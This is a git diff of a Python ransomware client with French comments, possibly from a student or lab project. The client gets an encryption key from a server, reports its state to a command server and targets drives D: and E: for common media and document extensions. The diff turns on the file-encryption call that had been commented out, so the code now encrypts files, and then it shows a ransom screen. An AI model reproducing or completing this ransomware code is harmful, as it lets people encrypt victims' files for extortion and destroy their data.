@@ -7,7 +7,7 @@ import utile.config as config
 import platform
 import hashlib
 import datetime
-#e
+
 
 KEY_FILE_PATH = 'encryption_key.bin'  # Chemin du fichier pour stocker la clé de chiffrement
 PATH_CONFIG = 'config_workstation.ini'  # Chemin du fichier de configuration
@@ -18,7 +18,7 @@ CONFIG_WORKSTATION = {
     'HASH': None,
     'IP': None,
     'KEY': None,  # Clé à récupérer du serveur de clés
-    'DISKS': ['d:', 'e:'],
+    'DISKS': ['D:', 'E:'],
     'PATHS': ['tests_1', 'tests_2'],
     'FILE_EXT': ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf'],
     'FREQ': None,
@@ -251,12 +251,11 @@ def main():
         data = network.receive_message(client)
         print('data:', data)
         type_message = message.get_message_type(data)
-        if type_message == "CONFIGURE":
+        print(type_message)
+        if type_message == "KEY_RESP":
             key = data['KEY']
             print('KEY:', key)
-            CONFIG_WORKSTATION.update({'HASH': data['HASH'], 'KEY': key, 'DISKS': data['DISKS'], 'PATHS': data['PATHS'],
-                                       'FILE_EXT': data['FILE_EXT'], 'FREQ': data['FREQ'], 'TYPE': data['TYPE'],
-                                       'OS': data['OS'], 'STATE': 'CRYPT'})
+            CONFIG_WORKSTATION.update({'HASH': data['KEY_RESP'], 'KEY': key, 'STATE': 'CRYPT'})
             print('config convertie en crypt')
 
         print('CONFIG_WORKSTATION :', CONFIG_WORKSTATION)
@@ -265,7 +264,7 @@ def main():
             network.send_message(client, message.set_message('CHGSTATE', [CONFIG_WORKSTATION['HASH'],CONFIG_WORKSTATION['STATE']]))
             print('sending chg state 1 crypt')
             for disk in CONFIG_WORKSTATION['DISKS']:
-                #encrypt_files_in_directory(disk, encryption_key_sha256, CONFIG_WORKSTATION['FILE_EXT'])
+                encrypt_files_in_directory(disk, CONFIG_WORKSTATION['KEY'], CONFIG_WORKSTATION['FILE_EXT'])
                 nb_files = count_encrypted_files(CONFIG_WORKSTATION['DISKS'])
                 print('fin cryptage')
             affichage_ransomware()
